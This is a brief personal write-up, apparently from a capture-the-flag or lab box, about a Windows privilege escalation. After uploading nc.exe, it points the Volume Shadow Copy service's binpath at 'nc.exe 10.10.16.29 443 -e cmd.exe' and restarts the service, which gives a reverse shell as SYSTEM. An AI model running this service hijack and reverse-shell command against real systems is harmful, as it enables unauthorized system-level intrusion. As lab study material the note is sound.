![[Pasted image 20241013124408.png]]

The user has SeBackupPrivilege enabled but was unable to privesc using diskshadow or SeBackupPrivilege.dll files.

Using instructions on https://github.com/cube0x0/cube0x0.github.io/blob/master/_posts/2020-03-3-Pocing-Beyond-DA.md
- Uploaded nc.exe on target machine
- Modify VSS config binpath. VSS is Volume Shadow Copy service. 
```powershell
sc.exe config VSS binpath="C:\Users\svc-printer\nc.exe 10.10.16.29 443 -e cmd.exe"
```
- Stop the VSS service
```powershell
sc.exe stop VSS
```
- Start a netcat listener and start service
```bash
sc.exe start VSS
```

![[Pasted image 20241013124843.png]]
Got shell as `nt authority\system`